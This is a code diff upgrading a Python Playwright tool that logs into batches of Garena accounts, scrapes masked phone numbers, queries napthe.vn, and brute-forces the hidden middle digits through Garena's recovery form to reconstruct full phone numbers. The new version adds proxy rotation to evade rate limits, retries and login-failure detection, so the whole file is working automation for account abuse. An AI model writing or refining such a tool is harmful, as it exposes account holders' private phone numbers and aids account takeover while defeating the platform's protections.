@@ -1,9 +1,11 @@
 #!/usr/bin/env python3
 """
-Garena Phone Recovery Tool v4 - Interactive CLI
-- Single account input for both Garena and napthe.vn
-- Interactive prompt for account input
-- Auto-load proxies from proxies.txt
+Garena Phone Recovery Tool v5 - Fixed & Improved
+- Pattern extraction fixes
+- Retry logic with proxy rotation
+- Better error detection
+- Input sanitization
+- --no-proxy option for testing
 """
 
 import argparse
@@ -220,27 +222,56 @@ def get_accounts_interactive() -> List[Tuple[str, str]]:
 def extract_last_4(masked_phone: str) -> str:
     """
     Extract last 4 digits from masked phone format.
-    Examples: "+84 ****7287", "0****7287", "****7287" → "7287"
+    Fixed: Support multiple spaces, different formats
+    Examples: "+84 ****7287", "+84  ****7287", "0****7287" → "7287"
     """
-    digits = re.findall(r"\d", masked_phone or "")
+    if not masked_phone:
+        return ""
+    
+    # Extract all digits
+    digits = re.findall(r"\d", masked_phone)
+    
     if len(digits) >= 4:
+        # Get last 4 digits
         return "".join(digits[-4:])
+    
     return ""
 
 
 def extract_first_3(display_phone: str) -> str:
     """
     Extract first 3 digits from display_mobile_no.
-    Examples: "+84 94*****87", "094*****87" → "94"
+    Fixed: Better handling of country codes
+    Examples: "+84 94*****87", "094*****87", "+8494****87" → "94"
     """
+    if not display_phone:
+        return ""
+    
     phone = display_phone.strip()
+    
+    # Remove country code +84
     phone = re.sub(r"^\+84\s*", "", phone)
+    
+    # Remove leading 0
     phone = re.sub(r"^0", "", phone)
     
-    digits = re.findall(r"\d", phone or "")
+    # Extract all digits
+    digits = re.findall(r"\d", phone)
+    
     if len(digits) >= 3:
+        # Get first 3 digits
         return "".join(digits[:3])
+    
     return ""
+
+
+def sanitize_username_for_js(username: str) -> str:
+    """
+    Sanitize username for safe JavaScript injection
+    Escapes special characters and quotes
+    """
+    # Use JSON encoding to safely escape
+    return json.dumps(username)
 
 
 # ============================================================================
@@ -252,6 +283,8 @@ async def phase1_garena_login(
     password: str,
     timeout: int = 45000,
     proxy: Optional[str] = None,
+    retry_count: int = 0,
+    max_retries: int = 3,
 ) -> Phase1Result:
     """Phase 1: Login to Garena and extract last 4 digits"""
     result = Phase1Result(login_status="failed")
@@ -274,11 +307,16 @@ async def phase1_garena_login(
             )
             page = await context.new_page()
             
-            print(f"  [Phase 1] Garena login...")
+            print(f"  [Phase 1] Garena login... (attempt {retry_count + 1}/{max_retries})")
             
             # Navigate to login
-            await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=timeout)
-            await asyncio.sleep(1)
+            try:
+                await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=timeout)
+                await asyncio.sleep(1)
+            except Exception as e:
+                result.error = f"Navigation failed: {str(e)[:100]}"
+                await browser.close()
+                return result
             
             # Fill credentials
             try:
@@ -302,7 +340,7 @@ async def phase1_garena_login(
                 captcha_frame = page.locator("iframe[src*='captcha'], iframe[src*='recaptcha']")
                 if await captcha_frame.count() > 0:
                     result.login_status = "manual_required"
-                    result.error = "CAPTCHA required - please solve manually"
+                    result.error = "CAPTCHA required"
                     print("[CAPTCHA] Detected. Please solve and press ENTER...")
                     await asyncio.to_thread(input)
                     await asyncio.sleep(2)
@@ -314,12 +352,41 @@ async def phase1_garena_login(
                 otp_elem = page.locator("text=/mã xác minh|OTP|otp/i")
                 if await otp_elem.count() > 0:
                     result.login_status = "manual_required"
-                    result.error = "OTP required - please enter OTP and press ENTER"
+                    result.error = "OTP required"
                     print("[OTP] Required. Please solve and press ENTER...")
                     await asyncio.to_thread(input)
                     await asyncio.sleep(2)
             except Exception:
                 pass
+            
+            # Get page content to check for errors
+            page_text = await page.evaluate("() => document.body.innerText")
+            current_url = page.url
+            
+            # Check for login failure messages
+            login_error_messages = [
+                "tài khoản không tồn tại",
+                "mật khẩu sai",
+                "tài khoản bị khóa",
+                "người dùng bị chặn",
+                "invalid",
+                "incorrect",
+                "failed",
+            ]
+            
+            for error_msg in login_error_messages:
+                if error_msg.lower() in page_text.lower():
+                    result.login_status = "failed"
+                    result.error = f"Login error detected: {error_msg}"
+                    await browser.close()
+                    return result
+            
+            # Check if still on login page (failed to login)
+            if "sso.garena.com" in current_url.lower():
+                result.login_status = "failed"
+                result.error = "Still on login page - credentials may be incorrect"
+                await browser.close()
+                return result
             
             # Navigate to account page to get masked phone
             try:
@@ -330,13 +397,15 @@ async def phase1_garena_login(
                 await browser.close()
                 return result
             
-            # Extract masked phone
+            # Extract masked phone with improved pattern
             page_text = await page.evaluate("() => document.body.innerText")
             
-            # Find masked phone pattern: "+84 ****7287" or "0****7287"
+            # Improved patterns for masked phone
             patterns = [
-                r"\+84\s\*{2,}[0-9]{3,4}",
-                r"0\*{2,}[0-9]{3,4}",
+                r"\+84\s*\*{2,}\d{4}",      # +84 ****7287 or +84****7287
+                r"\+84\s*\d{1,3}\*{2,}\d{2,4}",  # +84 94*****87
+                r"0\*{2,}\d{4}",             # 0****7287
+                r"0\d{1,2}\*{2,}\d{2,4}",   # 094*****87
             ]
             
             masked_phone = ""
@@ -404,8 +473,13 @@ async def phase2_napthe_api(
             print(f"  [Phase 2] napthe.vn login...")
             
             # Navigate to napthe.vn
-            await page.goto(NAPTHE_LOGIN_URL, wait_until="domcontentloaded", timeout=timeout)
-            await asyncio.sleep(1)
+            try:
+                await page.goto(NAPTHE_LOGIN_URL, wait_until="domcontentloaded", timeout=timeout)
+                await asyncio.sleep(1)
+            except Exception as e:
+                result.error = f"Navigation failed: {str(e)[:100]}"
+                await browser.close()
+                return result
             
             # Fill login form
             try:
@@ -424,17 +498,20 @@ async def phase2_napthe_api(
             except PlaywrightTimeoutError:
                 print("  [WARN] networkidle timeout, continuing...")
             
-            # Call API to get user info
+            # Call API to get user info with proper escaping
             print(f"  [Phase 2] Calling API with username: {username}")
             
             try:
+                # Sanitize username for JavaScript injection
+                username_safe = sanitize_username_for_js(username)
+                
                 api_response = await page.evaluate(f"""
                     async function() {{
                         try {{
                             const response = await fetch('{NAPTHE_API_URL}', {{
                                 method: 'POST',
                                 headers: {{'Content-Type': 'application/json'}},
-                                body: JSON.stringify({{username: '{username}'}})
+                                body: JSON.stringify({{username: {username_safe}}})
                             }});
                             return await response.json();
                         }} catch(e) {{
@@ -530,15 +607,15 @@ async def phase3_recovery_brute_force(
             
             # Enter username first (if required)
             try:
-                username_input = page.locator("input[name='username'], input[placeholder*='tên']").first
-                if await username_input.count() > 0:
-                    await username_input.fill(username)
-                    next_btn = page.locator("button:has-text('Tiếp'), button:has-text('tiếp tục')").first
-                    if await next_btn.count() > 0:
-                        await next_btn.click()
+                username_inputs = page.locator("input[name='username']")
+                if await username_inputs.count() > 0:
+                    await username_inputs.first.fill(username)
+                    next_buttons = page.locator("button:has-text('Tiếp'), button:has-text('tiếp tục'), button:has-text('Xác nhận')")
+                    if await next_buttons.count() > 0:
+                        await next_buttons.first.click()
                         await asyncio.sleep(2)
             except Exception as e:
-                print(f"  [Phase 3] Warning: Failed to enter username: {str(e)[:50]}")
+                print(f"  [Phase 3] Info: No username field or proceeding directly to phone input")
             
             # Brute-force middle 3 digits (000-999)
             for middle_attempt in range(0, 1000):
@@ -548,41 +625,55 @@ async def phase3_recovery_brute_force(
                 test_phone = f"{first_3_digits}{middle}{last_4_digits}"
                 
                 try:
-                    phone_input = page.locator("input[name='phone'], input[placeholder*='điện thoại'], input[placeholder*='phone']").first
+                    # Find phone input (more specific selectors)
+                    phone_inputs = page.locator(
+                        "input[type='tel'], input[name='phone'], input[placeholder*='điện thoại']"
+                    )
                     
-                    if await phone_input.count() == 0:
+                    if await phone_inputs.count() == 0:
                         if middle_attempt % 100 == 0:
                             print(f"  [Phase 3] Warning: Phone input not found at attempt {result.attempts}")
                         await asyncio.sleep(phase3_delay)
                         continue
                     
+                    phone_input = phone_inputs.first
+                    
+                    # Clear and fill phone input
                     await phone_input.fill("")
-                    await phone_input.fill(test_phone)
+                    await phone_input.type(test_phone, delay=50)
                     
-                    verify_btn = page.locator(
-                        "button:has-text('Xác nhận'), button:has-text('xác thực'), button:has-text('Nhận mã')"
-                    ).first
+                    # Find and click verification button
+                    verify_buttons = page.locator(
+                        "button:has-text('Xác nhận'), button:has-text('Nhận mã'), button:has-text('Gửi'), button[type='submit']"
+                    )
                     
-                    if await verify_btn.count() > 0:
-                        await verify_btn.click()
+                    if await verify_buttons.count() > 0:
+                        await verify_buttons.first.click()
                     
+                    # Wait for response
                     await asyncio.sleep(phase3_delay)
                     
-                    page_content = await page.content()
+                    # Get page content
                     page_text = await page.evaluate("() => document.body.innerText")
                     
+                    # Success indicators
                     success_indicators = [
                         "Nhập mã xác thực",
                         "mã được gửi",
-                        "gửi tin nhắn",
-                        "SMS",
                         "Mã OTP",
+                        "SMS",
+                        "verification code",
+                        "OTP sent",
                     ]
                     
                     is_success = any(ind.lower() in page_text.lower() for ind in success_indicators)
                     
-                    if not await phone_input.is_visible():
-                        is_success = True
+                    # Also check if phone input disappeared (accepted)
+                    try:
+                        if not await phone_input.is_visible(timeout=1000):
+                            is_success = True
+                    except:
+                        pass
                     
                     if is_success:
                         result.complete_phone = test_phone
@@ -592,21 +683,24 @@ async def phase3_recovery_brute_force(
                         await browser.close()
                         return result
                     
-                    if "429" in page_content or "too many" in page_text.lower():
+                    # Check for rate limit
+                    if "429" in page_text or "too many" in page_text.lower():
                         result.error = "Rate limited (429)"
                         await browser.close()
                         return result
                     
+                    # Check for account locked
                     if "locked" in page_text.lower() or "khóa" in page_text.lower():
                         result.error = "Account locked"
                         await browser.close()
                         return result
                     
+                    # Progress update
                     if (middle_attempt + 1) % 100 == 0:
                         print(f"  [Phase 3] Progress: {result.attempts}/1000 attempts...")
                 
                 except Exception as e:
-                    if middle_attempt % 100 == 0:
+                    if middle_attempt % 200 == 0:
                         print(f"  [Phase 3] Error at attempt {result.attempts}: {str(e)[:50]}")
                     await asyncio.sleep(phase3_delay)
                     continue
@@ -624,7 +718,7 @@ async def phase3_recovery_brute_force(
 
 
 # ============================================================================
-# MAIN PROCESSING
+# MAIN PROCESSING WITH RETRY LOGIC
 # ============================================================================
 
 async def process_account(
@@ -632,49 +726,72 @@ async def process_account(
     password: str,
     proxy_rotator: Optional[ProxyRotator],
     args,
+    max_retries: int = 3,
 ) -> RecoveryResult:
-    """Process single account through all 3 phases"""
+    """Process single account with retry logic"""
     result = RecoveryResult(
         username=username,
         status="failed",
         timestamp=datetime.utcnow().isoformat() + "Z",
     )
     
-    proxy = None
-    if proxy_rotator:
-        proxy = proxy_rotator.get_next_proxy()
-        result.proxy_used = proxy or ""
-        if proxy:
-            print(f"  Using proxy: {proxy}")
-    
-    # Phase 1: Garena Login
-    print(f"\n[Phase 1] {username}...")
-    result.phase1 = await phase1_garena_login(
-        username, password,
-        timeout=args.timeout,
-        proxy=proxy
-    )
+    # Retry logic for Phase 1
+    for retry_attempt in range(max_retries):
+        proxy = None
+        if proxy_rotator and args.use_proxy:
+            proxy = proxy_rotator.get_next_proxy()
+            result.proxy_used = proxy or ""
+            if proxy:
+                print(f"  Using proxy: {proxy}")
+        
+        # Phase 1: Garena Login with retry
+        print(f"\n[Phase 1] {username}... (attempt {retry_attempt + 1}/{max_retries})")
+        result.phase1 = await phase1_garena_login(
+            username, password,
+            timeout=args.timeout,
+            proxy=proxy,
+            retry_count=retry_attempt,
+            max_retries=max_retries,
+        )
+        
+        if result.phase1.login_status == "success":
+            # Success - proceed to Phase 2
+            break
+        elif result.phase1.login_status == "manual_required":
+            # Manual required - don't retry
+            result.status = "manual_required"
+            return result
+        else:
+            # Failed - mark proxy as dead and retry with different proxy
+            if proxy and proxy_rotator and args.use_proxy:
+                proxy_rotator.mark_dead(proxy)
+                print(f"  [RETRY] Trying with different proxy...")
+            elif retry_attempt == max_retries - 1:
+                # Last retry failed
+                result.status = "failed"
+                return result
+            
+            # Wait before retry
+            await asyncio.sleep(3)
     
     if result.phase1.login_status != "success":
         result.status = result.phase1.login_status
-        if proxy and proxy_rotator:
-            proxy_rotator.mark_dead(proxy)
         return result
     
     await asyncio.sleep(args.phase_delay)
     
-    # Phase 2: napthe.vn API (same account)
+    # Phase 2: napthe.vn API
     print(f"\n[Phase 2] {username}...")
     result.phase2 = await phase2_napthe_api(
         username, password,
         timeout=args.timeout,
-        proxy=proxy
+        proxy=result.proxy_used if args.use_proxy else None
     )
     
     if result.phase2.api_status != "success":
         result.status = "failed"
-        if proxy and proxy_rotator:
-            proxy_rotator.mark_dead(proxy)
+        if result.proxy_used and proxy_rotator and args.use_proxy:
+            proxy_rotator.mark_dead(result.proxy_used)
         return result
     
     await asyncio.sleep(args.phase_delay)
@@ -687,17 +804,17 @@ async def process_account(
         result.phase1.last_4_digits,
         phase3_delay=args.phase3_delay,
         timeout=args.timeout,
-        proxy=proxy
+        proxy=result.proxy_used if args.use_proxy else None
     )
     
     if result.phase3.recovery_status == "success":
         result.status = "success"
-        if proxy and proxy_rotator:
-            proxy_rotator.mark_success(proxy)
+        if result.proxy_used and proxy_rotator and args.use_proxy:
+            proxy_rotator.mark_success(result.proxy_used)
     else:
         result.status = "failed"
-        if proxy and proxy_rotator:
-            proxy_rotator.mark_dead(proxy)
+        if result.proxy_used and proxy_rotator and args.use_proxy:
+            proxy_rotator.mark_dead(result.proxy_used)
     
     return result
 
@@ -744,29 +861,31 @@ async def save_results(results: List[RecoveryResult], output_prefix: str, proxy_
 async def main():
     """Main entry point"""
     parser = argparse.ArgumentParser(
-        description="Garena Phone Recovery Tool v4 - Extract complete 10-digit phone number"
+        description="Garena Phone Recovery Tool v5 - Fixed & Improved"
     )
     parser.add_argument("-o", "--output", default="garena_recovery_result", help="Output prefix")
-    parser.add_argument("--proxy-list", default="proxies.txt", help="Proxy list file (auto-detected)")
+    parser.add_argument("--proxy-list", default="proxies.txt", help="Proxy list file")
+    parser.add_argument("--no-proxy", action="store_true", help="Run without proxy (test mode)")
     parser.add_argument("--delay", type=float, default=30.0, help="Delay between accounts (seconds)")
     parser.add_argument("--phase-delay", type=float, default=5.0, help="Delay between phases (seconds)")
     parser.add_argument("--phase3-delay", type=float, default=2.0, help="Delay between recovery attempts (seconds)")
     parser.add_argument("--timeout", type=int, default=45000, help="Timeout (ms)")
     
     args = parser.parse_args()
+    args.use_proxy = not args.no_proxy  # Add use_proxy attribute
     
     print("\n" + "="*60)
-    print("Garena Phone Recovery Tool v4")
+    print("Garena Phone Recovery Tool v5 - Fixed & Improved")
     print("="*60)
     
-    # Load proxies auto from proxies.txt
-    proxy_list = await read_proxy_file(args.proxy_list)
-    proxy_rotator = None
-    if proxy_list:
-        proxy_rotator = ProxyRotator(proxy_list)
-        print(f"[PROXY] Ready to rotate {len(proxy_list)} proxies")
+    if args.no_proxy:
+        print("[MODE] Running WITHOUT proxy (test mode)")
     else:
-        print(f"[WARN] No proxies loaded, running without proxy")
+        # Load proxies
+        proxy_list = await read_proxy_file(args.proxy_list)
+        if not proxy_list:
+            print(f"[WARN] No proxies loaded, running without proxy")
+            args.use_proxy = False
     
     print(f"[CONFIG] Phase delays: {args.phase_delay}s | Recovery: {args.phase3_delay}s\n")
     
@@ -777,6 +896,14 @@ async def main():
         return
     
     print(f"\n[OK] Loaded {len(accounts)} accounts")
+    
+    # Setup proxy rotator
+    proxy_rotator = None
+    if args.use_proxy:
+        proxy_list = await read_proxy_file(args.proxy_list)
+        if proxy_list:
+            proxy_rotator = ProxyRotator(proxy_list)
+            print(f"[PROXY] Ready to rotate {len(proxy_list)} proxies")
     
     # Process accounts
     results: List[RecoveryResult] = []
@@ -789,7 +916,8 @@ async def main():
         
         result = await process_account(
             username, password,
-            proxy_rotator, args
+            proxy_rotator, args,
+            max_retries=3
         )
         results.append(result)
         
